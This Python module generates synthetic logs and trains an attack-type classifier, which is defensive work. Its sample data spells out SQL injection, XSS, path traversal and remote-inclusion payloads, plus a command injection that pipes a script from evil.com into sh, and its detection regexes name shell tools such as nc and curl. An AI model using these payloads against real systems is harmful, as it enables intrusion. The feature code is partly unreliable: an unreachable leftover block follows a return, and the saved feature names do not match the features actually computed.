"""ML Training Pipeline for Attack Classification

This module creates and trains a supervised ML model for detecting various attack types
from log entries. It generates synthetic training data and trains a classifier.

Usage:
    python ml/train_model.py --generate-data --train --output models/attack_classifier.joblib
"""

import numpy as np
import json
import hashlib
import re
import os
import sys
import argparse
from datetime import datetime, timedelta
from typing import List, Dict, Any, Tuple, Optional
from collections import defaultdict
from dataclasses import dataclass, field

try:
    from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
    from sklearn.model_selection import train_test_split, cross_val_score
    from sklearn.metrics import classification_report, confusion_matrix
    from sklearn.preprocessing import LabelEncoder, StandardScaler
    from sklearn.pipeline import Pipeline
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("Warning: scikit-learn not available. Install with: pip install scikit-learn")

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))


@dataclass
class LogEntry:
    """Structured log entry for ML training"""
    timestamp: str
    source_ip: str
    user: str
    message: str
    severity: str
    log_type: str
    action: str = ""
    outcome: str = ""
    fields: Dict = field(default_factory=dict)
    attack_type: Optional[str] = None  # Label for training


ATTACK_PATTERNS = {
    'sql_injection': [
        r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
        r"(\%3D)|(=)[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
        r"\w*(\%27)|(\')|((\%6F)|(o)|(\%4F))((\%72)|(r)|(\%52))",
        r"((\%27)|(\')|)union",
        r"exec(\s|\+)+(s|x)p\w+",
        r"'\s*or\s+'?1'?\s*=\s*'?1",  # ' OR '1'='1 with flexible spacing (case insensitive via re.I)
        r"\"\s*or\s+\"?1\"?\s*=\s*\"?1",  # " OR "1"="1 with flexible spacing
        r"or\s+'?1'?\s*=\s*'?1",  # OR 1=1 variations
        r"and\s+'?1'?\s*=\s*'?1",  # AND 1=1 variations
        r"admin'\s*--",  # admin'-- with optional spaces
        r"union\s+all\s+select",
        r"concat\s*\(",
    ],
    'xss': [
        r"<script>",
        r"javascript:",
        r"onerror=",
        r"onload=",
        r"onmouseover=",
        r"alert\(",
        r"document\.cookie",
        r"%3Cscript%3E",
        r"<iframe",
        r"<img",
    ],
    'command_injection': [
        r";\s*(cat|ls|wget|curl|nc|bash|sh)\s",
        r"\|\s*(cat|ls|wget|curl|nc|bash|sh)\s",
        r"`\s*(cat|ls|wget|curl|nc|bash|sh)\s`",
        r"\$\(.*\)",
        r"chmod\s+\d{3,4}",
        r"wget\s+http",
        r"curl\s+http",
    ],
    'port_scan': [
        r"Connection refused",
        r"Connection timed out",
        r"No route to host",
        r"Port \d+ open",
        r"scan",
        r"nmap",
    ],
    'bruteforce': [
        r"Failed password",
        r"Authentication failure",
        r"Invalid user",
        r"login failed",
        r"wrong password",
    ],
    'password_spray': [
        r"authentication failure",
        r"unknown user",
        r"authentication failure",
    ],
    'ddos': [
        r"Connection reset by peer",
        r"Too many connections",
        r"Connection refused",
        r"flood",
        r"syn flood",
    ],
    'directory_traversal': [
        r"\.\./",
        r"\.\.\\",
        r"%2e%2e",
        r"etc/passwd",
        r"win.ini",
        r"boot.ini",
    ],
    'file_inclusion': [
        r"\?page=http",
        r"\?file=http",
        r"include\s*\(",
        r"require\s*\(",
    ],
    'sensitive_data_access': [
        r"password",
        r"credit card",
        r"ssn",
        r"social security",
        r"access denied.*confidential",
    ],
}


def generate_normal_logs(count: int = 1000, start_time: datetime = None) -> List[LogEntry]:
    """Generate normal (benign) log entries"""
    if start_time is None:
        start_time = datetime.now()

    logs = []
    users = ['alice', 'bob', 'charlie', 'david', 'eve', 'frank', 'grace', 'henry']
    actions = ['login', 'view', 'create', 'update', 'delete', 'logout', 'search', 'download']
    messages = [
        'User {user} successfully logged in',
        'User logged out',
        'Session established for {user}',
        'Authentication successful for {user}',
        'Profile updated by {user}',
        'Settings saved for {user}',
        'Account created successfully',
        'Password changed by {user}',
        'Email preferences updated',
        'Notification sent to {user}',
        'Dashboard loaded successfully',
        'Data retrieved from database',
        'Cache refreshed for user {user}',
        'API request completed successfully',
        'Background job finished',
        'Queue processing completed',
        'Service health check passed',
        'Memory usage within limits',
        'CPU utilization normal',
        'Disk space check passed',
        'Backup completed successfully',
        'Log rotation executed',
        'Connection pool healthy',
        'Request processed in 45ms',
        'Response sent with 200 OK',
        'Token validated successfully',
        'Permission check passed',
        'Rate limit check passed',
        'Audit log entry created',
        'Metrics collected successfully',
    ]

    for i in range(count):
        timestamp = start_time + timedelta(seconds=i * 60)
        user = np.random.choice(users)
        action = np.random.choice(actions)

        log = LogEntry(
            timestamp=timestamp.isoformat() + 'Z',
            source_ip=f"192.168.1.{np.random.randint(10, 200)}",
            user=user,
            message=np.random.choice(messages).format(user=user),
            severity=np.random.choice(['info', 'debug'], p=[0.9, 0.1]),
            log_type='apache_combined',
            action=action,
            outcome='success',
            attack_type='normal'
        )
        logs.append(log)

    return logs


def generate_attack_logs(attack_type: str, count: int = 100, start_time: datetime = None) -> List[LogEntry]:
    """Generate attack log entries for a specific attack type"""
    if start_time is None:
        start_time = datetime.now()

    logs = []

    if attack_type == 'sql_injection':
        attack_messages = [
            ("GET /products.php?id=1' OR '1'='1 HTTP/1.1", "200"),
            ("POST /login.php user=' OR 1=1--&password=test", "200"),
            ("GET /search.php?q=UNION ALL SELECT * FROM users", "200"),
            ("GET /item.php?id=1; DROP TABLE users--", "500"),
            ("GET /profile.php?user=admin'--", "200"),
            ("GET /products.php?id=1 OR 1=1", "200"),
        ]
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i)
            msg, status = attack_messages[np.random.randint(len(attack_messages))]
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=f"203.0.113.{np.random.randint(10, 250)}",
                user='anonymous',
                message=msg,
                severity='warning',
                log_type='apache_combined',
                action='http_request',
                outcome=status,
                attack_type='sql_injection'
            )
            logs.append(log)

    elif attack_type == 'xss':
        attack_messages = [
            ("GET /search?q=<script>alert('xss')</script>", "200"),
            ("POST /comment user=<img src=x onerror=alert(1)>", "200"),
            ("GET /profile?name=<iframe src='javascript:alert(1)'>", "200"),
            ("GET /contact?message=<script>document.location='http://evil.com'</script>", "200"),
            ("GET /search?q=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E", "200"),
        ]
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i)
            msg, status = attack_messages[np.random.randint(len(attack_messages))]
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=f"198.51.100.{np.random.randint(10, 250)}",
                user='anonymous',
                message=msg,
                severity='warning',
                log_type='apache_combined',
                action='http_request',
                outcome=status,
                attack_type='xss'
            )
            logs.append(log)

    elif attack_type == 'command_injection':
        attack_messages = [
            ("GET /ping?host=127.0.0.1; cat /etc/passwd", "200"),
            ("GET /export.php?file=/etc/passwd", "200"),
            ("GET /debug?cmd=whoami", "200"),
            ("POST /upload.php --upload-file=/etc/shadow", "403"),
            ("GET /test?url=http://evil.com; ls -la", "200"),
            ("GET /ping?ip=; curl http://evil.com/shell.sh|sh", "200"),
        ]
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i)
            msg, status = attack_messages[np.random.randint(len(attack_messages))]
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=f"192.0.2.{np.random.randint(10, 250)}",
                user='www-data',
                message=msg,
                severity='error',
                log_type='apache_combined',
                action='http_request',
                outcome=status,
                attack_type='command_injection'
            )
            logs.append(log)

    elif attack_type == 'port_scan':
        scan_messages = [
            "Connection from 203.0.113.50 port 22",
            "Connection from 203.0.113.50 port 80",
            "Connection from 203.0.113.50 port 443",
            "Connection from 203.0.113.50 port 3306",
            "Connection from 203.0.113.50 port 5432",
            "Connection from 203.0.113.50 port 8080",
        ]
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i * 0.5)
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=f"203.0.113.{np.random.randint(50, 60)}",
                user='',
                message=np.random.choice(scan_messages),
                severity='info',
                log_type='ssh',
                action='connection',
                outcome='failure',
                attack_type='port_scan'
            )
            logs.append(log)

    elif attack_type == 'bruteforce':
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i * 2)
            user = np.random.choice(['admin', 'root', 'administrator', 'user'])
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=f"45.33.32.{np.random.randint(100, 200)}",
                user=user,
                message=f"Failed password for user {user}",
                severity='warning',
                log_type='ssh',
                action='login',
                outcome='failure',
                attack_type='bruteforce'
            )
            logs.append(log)

    elif attack_type == 'password_spray':
        base_ip = f"185.220.101.{np.random.randint(1, 250)}"
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i * 3)
            user = f"user{i % 100}"
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=base_ip,
                user=user,
                message=f"Authentication failure for unknown user: {user}",
                severity='warning',
                log_type='apache_combined',
                action='login',
                outcome='failure',
                attack_type='password_spray'
            )
            logs.append(log)

    elif attack_type == 'directory_traversal':
        attack_messages = [
            ("GET /files/../../etc/passwd HTTP/1.1", "200"),
            ("GET /images/..%2f..%2fwin.ini", "200"),
            ("GET /page.php?file=../../../etc/shadow", "403"),
            ("GET /download?file=..\\..\\boot.ini", "200"),
            ("GET /view.php?path=/etc/passwd", "200"),
            ("GET /static/../../etc/passwd", "200"),
        ]
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i)
            msg, status = attack_messages[np.random.randint(len(attack_messages))]
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=f"203.0.113.{np.random.randint(100, 200)}",
                user='anonymous',
                message=msg,
                severity='warning',
                log_type='apache_combined',
                action='http_request',
                outcome=status,
                attack_type='directory_traversal'
            )
            logs.append(log)

    elif attack_type == 'file_inclusion':
        attack_messages = [
            ("GET /index.php?page=http://evil.com/shell.txt", "200"),
            ("GET /template.php?file=http://evil.com/malicious.txt", "200"),
            ("GET /download.php?path=http://evil.com/shell", "200"),
            ("GET /view.php?template=http://evil.com/rce", "200"),
            ("GET /admin.php?include=config.php", "200"),
        ]
        for i in range(count):
            timestamp = start_time + timedelta(seconds=i)
            msg, status = attack_messages[np.random.randint(len(attack_messages))]
            log = LogEntry(
                timestamp=timestamp.isoformat() + 'Z',
                source_ip=f"198.51.100.{np.random.randint(100, 200)}",
                user='anonymous',
                message=msg,
                severity='warning',
                log_type='apache_combined',
                action='http_request',
                outcome=status,
                attack_type='file_inclusion'
            )
            logs.append(log)

    return logs


def extract_attack_features(entry: LogEntry) -> List[float]:
    """Extract features for attack classification from a log entry"""
    features = []
    message = entry.message.lower()
    action = entry.action.lower()
    source_ip = entry.source_ip

    # Feature 1: Is external IP (not 192.168.x.x, 10.x.x.x, 172.16-31.x.x)
    is_external = 1.0 if not (
        source_ip.startswith('192.168.') or
        source_ip.startswith('10.') or
        source_ip.startswith('172.16') or
        source_ip.startswith('172.17') or
        source_ip.startswith('172.18') or
        source_ip.startswith('172.19') or
        source_ip.startswith('172.20') or
        source_ip.startswith('172.21') or
        source_ip.startswith('172.22') or
        source_ip.startswith('172.23') or
        source_ip.startswith('172.24') or
        source_ip.startswith('172.25') or
        source_ip.startswith('172.26') or
        source_ip.startswith('172.27') or
        source_ip.startswith('172.28') or
        source_ip.startswith('172.29') or
        source_ip.startswith('172.30') or
        source_ip.startswith('172.31')
    ) else 0.0
    features.append(is_external)

    # Feature 2: Message length normalized
    features.append(min(len(message) / 500.0, 1.0))

    # Feature 3: Has SQL injection specific patterns (UNION, SELECT, DROP, --, OR 1=1)
    sql_patterns = len(re.findall(
        r"union\s+select|"  # UNION SELECT
        r"select\s+.*\s+from|"  # SELECT ... FROM
        r"drop\s+table|"  # DROP TABLE
        r";\s*--|"  # Semicolon followed by comment
        r"--\s*$|"  # Comment at end
        r"'\s*or\s+'?1'?\s*=\s*'?1|"  # ' OR '1'='1 variations (flexible spacing and quotes)
        r"\"\s*or\s+\"?1\"?\s*=\s*\"?1|"  # " OR "1"="1 variations
        r"or\s+'?1'?\s*=\s*'?1|"  # OR 1=1 variations
        r"and\s+'?1'?\s*=\s*'?1",  # AND 1=1 variations
        message, re.IGNORECASE))
    features.append(min(sql_patterns / 3.0, 1.0))

    # Feature 4: Has XSS patterns (<script, javascript:, onerror, onload)
    xss_patterns = len(re.findall(r"<script|javascript:|on\w+\s*=", message))
    features.append(min(xss_patterns / 3.0, 1.0))

    # Feature 5: Has command injection patterns (; | ` $() with system commands)
    cmd_patterns = len(re.findall(r"[;|`]\s*(cat|ls|wget|curl|nc|bash|sh|whoami|id|uname)\s|chmod\s+\d+|wget\s+http|curl\s+http", message))
    features.append(min(cmd_patterns / 3.0, 1.0))

    # Feature 6: Has directory traversal patterns (../, ..\, %2e%2e)
    dt_patterns = len(re.findall(r"\.\.(\/|\\)|%2e%2e|etc/passwd|win\.ini|boot\.ini", message))
    features.append(min(dt_patterns / 3.0, 1.0))

    # Feature 7: Has file inclusion patterns (?page=http, include(, require()
    fi_patterns = len(re.findall(r"\?page\s*=|file\s*=|include\s*\(|require\s*\(.*http", message))
    features.append(min(fi_patterns / 3.0, 1.0))

    # Feature 8: Is HTTP request (GET/POST/PUT/DELETE with URL pattern)
    is_http = 1.0 if re.search(r'\b(get|post|put|delete|patch)\s+/[^\s]*', message) else 0.0
    features.append(is_http)

    # Feature 9: Has failure outcome (works with both 'failure' and HTTP error codes)
    has_failure = 1.0 if entry.outcome == 'failure' or re.match(r'^(4|5)\d{2}$', str(entry.outcome)) else 0.0
    features.append(has_failure)

    # Feature 10: Severity level (warning/error = 1, others = 0)
    severity_val = {'debug': 0, 'info': 0, 'warning': 1, 'error': 1, 'critical': 1}
    features.append(severity_val.get(entry.severity, 0))

    # Feature 11: Is anonymous/system user
    is_anonymous = 1.0 if entry.user in ['', 'anonymous', 'www-data', 'nobody', 'root'] else 0.0
    features.append(is_anonymous)

    # Feature 12: Has URL encoding (%XX)
    has_url_encoding = 1.0 if re.search(r'%[0-9a-fA-F]{2}', message) else 0.0
    features.append(has_url_encoding)

    # Feature 13: Has IP address in message (potential C2/exfil)
    has_ip_in_message = 1.0 if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', message) else 0.0
    features.append(has_ip_in_message)

    # Feature 14: Has port numbers (port scan indicator)
    has_port = 1.0 if re.search(r'port\s+\d+|:\d{2,5}', message) else 0.0
    features.append(has_port)

    # Feature 15: Has system file references
    system_files = len(re.findall(r'/etc/|/proc/|/var/|/usr/|\\windows\\|\\system32\\', message))
    features.append(min(system_files / 3.0, 1.0))

    # Feature 16: Has sensitive data keywords
    sensitive_keywords = sum(1 for kw in ['password', 'credential', 'token', 'secret', 'key', 'auth'] if kw in message)
    features.append(min(sensitive_keywords / 3.0, 1.0))

    # Feature 17: Is login action
    is_login = 1.0 if 'login' in action or 'auth' in message or 'password' in message else 0.0
    features.append(is_login)

    # Feature 18: Has angle brackets (XSS/HTML injection)
    has_angle_brackets = 1.0 if re.search(r'<[^>]+>', message) else 0.0
    features.append(has_angle_brackets)

    # Feature 19: Has single quotes (SQL injection)
    has_single_quote = 1.0 if "'" in message else 0.0
    features.append(has_single_quote)

    # Feature 20: Has equals sign with quotes (SQL injection assignment)
    has_eq_quotes = 1.0 if re.search(r"=\s*['\"]", message) else 0.0
    features.append(has_eq_quotes)

    # Feature 21: Has double dash (SQL comment)
    has_double_dash = 1.0 if '--' in message else 0.0
    features.append(has_double_dash)

    # Feature 22: Has semicolon (command chaining)
    has_semicolon = 1.0 if ';' in message else 0.0
    features.append(has_semicolon)

    # Feature 23: Has pipe (command piping)
    has_pipe = 1.0 if '|' in message else 0.0
    features.append(has_pipe)

    # Feature 24: Has backtick (command substitution)
    has_backtick = 1.0 if '`' in message else 0.0
    features.append(has_backtick)

    # Feature 25: Is SSH/log connection message
    is_connection = 1.0 if 'connection' in message or 'port' in message else 0.0
    features.append(is_connection)

    return features
    sql_patterns = sum(1 for pattern in ATTACK_PATTERNS['sql_injection'] if re.search(pattern, message, re.I))
    features.append(min(sql_patterns / 3.0, 1.0))

    # Feature 5: Has XSS patterns
    xss_patterns = sum(1 for pattern in ATTACK_PATTERNS['xss'] if re.search(pattern, message, re.I))
    features.append(min(xss_patterns / 3.0, 1.0))

    # Feature 6: Has command injection patterns
    cmd_patterns = sum(1 for pattern in ATTACK_PATTERNS['command_injection'] if re.search(pattern, message, re.I))
    features.append(min(cmd_patterns / 3.0, 1.0))

    # Feature 7: Has directory traversal patterns
    dt_patterns = sum(1 for pattern in ATTACK_PATTERNS['directory_traversal'] if re.search(pattern, message, re.I))
    features.append(min(dt_patterns / 3.0, 1.0))

    # Feature 8: Has file inclusion patterns
    fi_patterns = sum(1 for pattern in ATTACK_PATTERNS['file_inclusion'] if re.search(pattern, message, re.I))
    features.append(min(fi_patterns / 3.0, 1.0))

    # Feature 9: Is HTTP request
    is_http = 1.0 if action == 'http_request' or message.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')) else 0.0
    features.append(is_http)

    # Feature 10: Has failure outcome
    has_failure = 1.0 if entry.outcome == 'failure' else 0.0
    features.append(has_failure)

    # Feature 11: Has warning or error severity
    severity_val = {'debug': 0, 'info': 0, 'warning': 1, 'error': 2, 'critical': 2}
    features.append(min(severity_val.get(entry.severity, 0) / 2.0, 1.0))

    # Feature 12: Is anonymous user
    is_anonymous = 1.0 if entry.user in ['', 'anonymous', 'www-data', 'nobody'] else 0.0
    features.append(is_anonymous)

    # Feature 13: Has URL encoding patterns
    has_url_encoding = 1.0 if re.search(r'%[0-9a-fA-F]{2}', message) else 0.0
    features.append(has_url_encoding)

    # Feature 14: Has IP address in message
    has_ip_in_message = 1.0 if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', message) else 0.0
    features.append(has_ip_in_message)

    # Feature 15: Has port numbers in message
    has_port = 1.0 if re.search(r':\d{2,5}', message) else 0.0
    features.append(has_port)

    # Feature 16: Has system file references
    system_files = len(re.findall(r'/etc/|/proc/|/var/|/usr/|\\windows\\|\\system32\\', message, re.I))
    features.append(min(system_files / 3.0, 1.0))

    # Feature 17: Has sensitive data keywords
    sensitive_keywords = sum(1 for kw in ['password', 'credential', 'token', 'secret', 'key', 'auth'] if kw in message)
    features.append(min(sensitive_keywords / 3.0, 1.0))

    # Feature 18: Is login action
    is_login = 1.0 if 'login' in action or 'auth' in action or 'password' in message else 0.0
    features.append(is_login)

    # Feature 19: Has escape characters
    has_escape = 1.0 if re.search(r"\\['\";]|&#x", message) else 0.0
    features.append(has_escape)

    # Feature 20: Request method (1 for GET/POST, 0 otherwise)
    request_method = 1.0 if re.search(r'^(GET|POST|PUT|DELETE|PATCH)\s', message) else 0.0
    features.append(request_method)

    return features


def prepare_training_data(logs: List[LogEntry]) -> Tuple[np.ndarray, np.ndarray]:
    """Prepare training data from log entries"""
    X = []
    y = []

    for entry in logs:
        features = extract_attack_features(entry)
        X.append(features)
        y.append(entry.attack_type)

    return np.array(X), np.array(y)


def generate_dataset(output_dir: str = 'data') -> str:
    """Generate synthetic training dataset"""
    print("Generating training dataset...")

    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Generate normal logs
    normal_logs = generate_normal_logs(count=2000)

    # Generate attack logs
    attack_types = ['sql_injection', 'xss', 'command_injection', 'port_scan',
                   'bruteforce', 'password_spray', 'directory_traversal', 'file_inclusion']

    all_logs = normal_logs.copy()
    for attack_type in attack_types:
        attack_logs = generate_attack_logs(attack_type, count=500)
        all_logs.extend(attack_logs)

    # Shuffle logs
    np.random.shuffle(all_logs)

    # Prepare features and labels
    X, y = prepare_training_data(all_logs)

    # Save dataset
    dataset = {
        'features': X.tolist(),
        'labels': y.tolist(),
        'attack_types': attack_types + ['normal'],
        'feature_names': [
            'is_external_ip', 'message_length', 'special_chars', 'sql_patterns',
            'xss_patterns', 'cmd_patterns', 'dt_patterns', 'fi_patterns',
            'is_http_request', 'has_failure', 'severity_level', 'is_anonymous',
            'has_url_encoding', 'has_ip_in_message', 'has_port', 'system_file_refs',
            'sensitive_keywords', 'is_login_action', 'has_escape_chars', 'is_http_method'
        ]
    }

    dataset_path = os.path.join(output_dir, 'training_dataset.json')
    with open(dataset_path, 'w') as f:
        json.dump(dataset, f, indent=2)

    print(f"Generated {len(all_logs)} samples with {len(attack_types) + 1} classes")
    print(f"Dataset saved to {dataset_path}")

    return dataset_path


def train_model(dataset_path: str, output_path: str = 'models/attack_classifier.joblib',
                test_size: float = 0.2, cv_folds: int = 5) -> Dict[str, Any]:
    """Train the attack classification model"""
    print(f"Loading dataset from {dataset_path}")

    with open(dataset_path, 'r') as f:
        dataset = json.load(f)

    X = np.array(dataset['features'])
    y = np.array(dataset['labels'])
    feature_names = dataset['feature_names']

    print(f"Training data shape: {X.shape}")
    print(f"Classes: {dataset['attack_types']}")

    # Encode labels
    label_encoder = LabelEncoder()
    y_encoded = label_encoder.fit_transform(y)

    # Split data
    X_train, X_test, y_train, y_test = train_test_split(
        X, y_encoded, test_size=test_size, random_state=42, stratify=y_encoded
    )

    print(f"Train size: {len(X_train)}, Test size: {len(X_test)}")

    # Create pipeline
    pipeline = Pipeline([
        ('scaler', StandardScaler()),
        ('classifier', RandomForestClassifier(
            n_estimators=100,
            max_depth=15,
            min_samples_split=5,
            min_samples_leaf=2,
            random_state=42,
            n_jobs=-1
        ))
    ])

    # Train model
    print("Training Random Forest classifier...")
    pipeline.fit(X_train, y_train)

    # Cross-validation
    print(f"Performing {cv_folds}-fold cross-validation...")
    cv_scores = cross_val_score(pipeline, X_train, y_train, cv=cv_folds, scoring='accuracy')
    print(f"CV Accuracy: {cv_scores.mean():.4f} (+/- {cv_scores.std() * 2:.4f})")

    # Evaluate on test set
    y_pred = pipeline.predict(X_test)
    test_accuracy = (y_pred == y_test).mean()
    print(f"Test Accuracy: {test_accuracy:.4f}")

    # Classification report
    print("\nClassification Report:")
    class_names = label_encoder.classes_
    print(classification_report(y_test, y_pred, target_names=class_names))

    # Save model and metadata
    model_data = {
        'pipeline': pipeline,
        'label_encoder': label_encoder,
        'feature_names': feature_names,
        'attack_types': dataset['attack_types'],
        'training_date': datetime.now().isoformat(),
        'test_accuracy': test_accuracy,
        'cv_accuracy': float(cv_scores.mean()),
    }

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    import joblib
    joblib.dump(model_data, output_path)
    print(f"\nModel saved to {output_path}")

    return {
        'test_accuracy': test_accuracy,
        'cv_accuracy': cv_scores.mean(),
        'model_path': output_path
    }


def load_model(model_path: str) -> Optional[Dict[str, Any]]:
    """Load a trained model"""
    if not os.path.exists(model_path):
        return None

    import joblib
    return joblib.load(model_path)


def predict_attack_type(log_message: str, log_type: str = 'apache_combined',
                       source_ip: str = '', user: str = '',
                       outcome: str = 'failure', severity: str = 'warning') -> Dict[str, Any]:
    """Predict attack type for a log message using the trained model"""
    import joblib

    model_path = 'models/attack_classifier.joblib'
    if not os.path.exists(model_path):
        return {'error': 'Model not trained. Run: python ml/train_model.py --generate-data --train'}

    model_data = load_model(model_path)
    if model_data is None:
        return {'error': 'Failed to load model'}

    # Create synthetic entry for feature extraction
    entry = LogEntry(
        timestamp=datetime.now().isoformat() + 'Z',
        source_ip=source_ip,
        user=user,
        message=log_message,
        severity=severity,
        log_type=log_type,
        action='http_request',
        outcome=outcome
    )

    # Extract features
    features = np.array(extract_attack_features(entry)).reshape(1, -1)

    # Predict
    pipeline = model_data['pipeline']
    label_encoder = model_data['label_encoder']

    prediction = pipeline.predict(features)
    probability = pipeline.predict_proba(features)[0]

    attack_type = label_encoder.inverse_transform(prediction)[0]
    confidence = float(max(probability))

    return {
        'attack_type': attack_type,
        'confidence': confidence,
        'all_predictions': {
            label_encoder.classes_[i]: float(probability[i])
            for i in range(len(probability))
        }
    }


def evaluate_model(model_path: str, dataset_path: str = 'data/training_dataset.json'):
    """Evaluate the trained model on the dataset"""
    if not os.path.exists(model_path):
        print(f"Model not found: {model_path}")
        return

    if not os.path.exists(dataset_path):
        print(f"Dataset not found: {dataset_path}")
        return

    with open(dataset_path, 'r') as f:
        dataset = json.load(f)

    X = np.array(dataset['features'])
    y = np.array(dataset['labels'])

    model_data = load_model(model_path)
    if model_data is None:
        print("Failed to load model")
        return

    pipeline = model_data['pipeline']
    label_encoder = model_data['label_encoder']
    y_encoded = label_encoder.transform(y)

    y_pred = pipeline.predict(X)

    print("Model Evaluation Report")
    print("=" * 50)
    print(f"Dataset samples: {len(X)}")
    print(f"Model accuracy: {(y_pred == y_encoded).mean():.4f}")
    print(f"\nConfusion Matrix:")
    print(confusion_matrix(y_encoded, y_pred))
    print(f"\nClassification Report:")
    print(classification_report(y_encoded, y_pred, target_names=label_encoder.classes_))


def main():
    parser = argparse.ArgumentParser(description='ML Training Pipeline for Attack Classification')
    parser.add_argument('--generate-data', action='store_true', help='Generate synthetic training data')
    parser.add_argument('--train', action='store_true', help='Train the model')
    parser.add_argument('--evaluate', action='store_true', help='Evaluate the model')
    parser.add_argument('--predict', type=str, help='Predict attack type for given message')
    parser.add_argument('--output', type=str, default='models/attack_classifier.joblib', help='Output model path')
    parser.add_argument('--dataset', type=str, default='data/training_dataset.json', help='Dataset path')
    parser.add_argument('--data-dir', type=str, default='data', help='Data directory')

    args = parser.parse_args()

    if not ML_AVAILABLE:
        print("Error: scikit-learn is required. Install with: pip install scikit-learn")
        sys.exit(1)

    if args.generate_data:
        generate_dataset(args.data_dir)

    if args.train:
        train_model(args.dataset, args.output)

    if args.evaluate:
        evaluate_model(args.output, args.dataset)

    if args.predict:
        result = predict_attack_type(args.predict)
        print(json.dumps(result, indent=2))

    if not any([args.generate_data, args.train, args.evaluate, args.predict]):
        parser.print_help()


if __name__ == '__main__':
    main()
